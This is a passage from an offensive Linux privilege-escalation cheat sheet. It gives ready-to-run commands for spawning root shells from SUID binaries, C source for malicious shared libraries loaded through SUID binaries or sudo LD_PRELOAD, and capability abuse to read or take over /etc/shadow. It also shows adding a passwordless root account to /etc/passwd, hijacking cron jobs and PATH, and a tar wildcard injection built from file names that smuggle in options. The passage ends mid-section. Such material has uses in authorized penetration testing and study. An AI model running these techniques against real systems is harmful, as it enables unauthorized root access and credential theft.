HIGH-VALUE SUID EXPLOITATION:

find (SUID):
  find . -exec /bin/sh -p \; -quit
  # -exec runs command. /bin/sh -p preserves SUID. -quit stops after first match.
  # Result: Shell running as root (if find is SUID root).

vim / vi (SUID):
  vim -c ':!/bin/sh'  # Run shell command from vim
  vim -c ':set shell=/bin/sh' -c ':shell'

nmap (SUID, older versions <5.20):
  nmap --interactive    # Interactive mode
  nmap> !sh             # Spawn shell from interactive prompt

python / python3 (SUID):
  python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

cp (SUID):
  # Can overwrite /etc/passwd:
  echo 'attacker:$6$salt$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
  cp /etc/passwd /etc/passwd.bak  # (if SUID cp can read/write)
  # Or add passwordless root:
  echo 'attacker::0:0:root:/root:/bin/bash' >> /etc/passwd  # No password hash

bash / sh (SUID):
  bash -p       # -p: Don't reset EUID. Shell runs with SUID privileges.
  # Direct shell as root.

GTFOBins: The definitive reference for SUID/SUDO/capabilities abuse.

--- SHARED LIBRARY INJECTION (SUID BINARY) ---

  When SUID binary loads a shared library from a path you can write to:
  
  Step 1: Use strace to find library loads
  strace /usr/local/bin/vulnerable-suid 2>&1 | grep "open\|access" | grep "\.so"
  # Look for: open("/lib/vulnerable_lib.so", O_RDONLY) = -1 ENOENT (missing library!)
  
  Step 2: If library missing from writable path:
  # Create malicious library:
  cat > /tmp/exploit.c << 'EOF'
  #include <stdio.h>
  #include <stdlib.h>
  
  void __attribute__((constructor)) init() {
      setuid(0);
      setgid(0);
      system("/bin/bash -p");
  }
  EOF
  
  gcc -shared -fPIC -o /path/writable/vulnerable_lib.so /tmp/exploit.c
  # Next run of SUID binary: Loads our library → constructor runs → root shell.

SUDO ABUSE — ENVIRONMENT VARIABLES:
  sudo LD_PRELOAD: If env_keep += LD_PRELOAD in sudoers:
  
  # Create malicious shared library:
  cat > /tmp/preload.c << 'EOF'
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  EOF
  gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
  
  sudo LD_PRELOAD=/tmp/preload.so find  # Runs find as root, preloads our library first.

PART 4: CAPABILITIES

--- LINUX CAPABILITIES ---

Linux capabilities: Break root privileges into discrete units.
Process can have specific capabilities WITHOUT being root.
File capabilities: Binary can be executed with specific capabilities (like SUID but granular).

FINDING CAPABILITIES:
  getcap -r / 2>/dev/null    # Find all files with capabilities set

HIGH-VALUE CAPABILITIES FOR PRIVESC:

cap_setuid:
  Allows: setuid() to any UID.
  
  # Python with cap_setuid:
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

cap_net_raw:
  Allows: Raw socket operations. Packet sniffing/forging.
  
  # tcpdump with cap_net_raw: Can capture all traffic
  tcpdump -i eth0 -w /tmp/capture.pcap   # Captures everything including cleartext creds

cap_sys_admin:
  Extremely powerful. Mount filesystems, manage namespaces, many more.
  
  # Mount a tmpfs and overwrite things:
  mount -t tmpfs tmpfs /mnt
  # Various kernel exploit enablers

cap_chown:
  Allows: Changing ownership of any file.
  
  # Take ownership of /etc/shadow:
  python3 -c "import os; os.chown('/etc/shadow', 1000, 1000)"
  # Now readable by our user. Contains hashed passwords. Crack offline.

cap_dac_read_search:
  Bypass file read permission checks.
  
  # Read any file regardless of permissions:
  python3 -c "print(open('/etc/shadow').read())"
  # (if python has this capability)

cap_dac_override:
  Bypass all file permission checks (read, write, execute).
  
  # Write to any file:
  # Could add SSH key to root, modify /etc/passwd, etc.

--- FINDING CRON JOBS ---

  cat /etc/crontab                          # System-wide cron

  # Upload pspy64 to target, run it, wait to see what cron jobs execute.
  # Shows: Exact command line including script paths.
  ./pspy64 2>/dev/null | grep -v "\[pspy\]"

EXPLOITATION PATHS:

Path 1: Writable script run by root cron:
  crontab: * * * * * root /opt/maintenance/backup.sh
  
  ls -la /opt/maintenance/backup.sh
  # Output: -rwxrwxrwx root root backup.sh  ← WORLD WRITABLE
  
  echo 'chmod u+s /bin/bash' >> /opt/maintenance/backup.sh
  # Wait one minute. bash becomes SUID.
  bash -p  # Root shell.

Path 2: Script calls binary from writable PATH:
  backup.sh:
  #!/bin/bash
  tar czf /backup/data.tar.gz /home/user
  
  If PATH includes writable directory BEFORE /bin or /usr/bin:
  echo $PATH   # e.g., /home/user/bin:/usr/local/bin:/usr/bin:/bin
  
  mkdir -p /home/user/bin
  cat > /home/user/bin/tar << 'EOF'
  #!/bin/bash
  chmod u+s /bin/bash
  EOF
  chmod +x /home/user/bin/tar
  # Next cron run: Calls /home/user/bin/tar (our fake tar) not /bin/tar.

Path 3: Wildcard injection in cron tar:
  Cron: tar czf /backup/archive.tar.gz /home/user/files/*
  
  The * expands to all files in /home/user/files/.
  tar interprets filenames beginning with - as options.
  
  Create files with option-like names:
  cd /home/user/files
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=chmod u+s /bin/bash'
  
  When cron runs: tar czf ... --checkpoint=1 --checkpoint-action=exec=chmod u+s /bin/bash ...
  tar executes the checkpoint action! bash becomes SUID.

--- WRITEABLE PATH DIRECTORIES ---

If any directory in $PATH is writable AND comes before the legitimate binary path:
  Find writable dirs in PATH:
  echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'ls -ld {} 2>/dev/null' | grep "^d.w"
  
  Or: for dir in $(echo $PATH | tr ':' '\n'); do ls -ld $dir 2>/dev/null; done

CLASSIC PATH HIJACK (SUID script calling relative command):
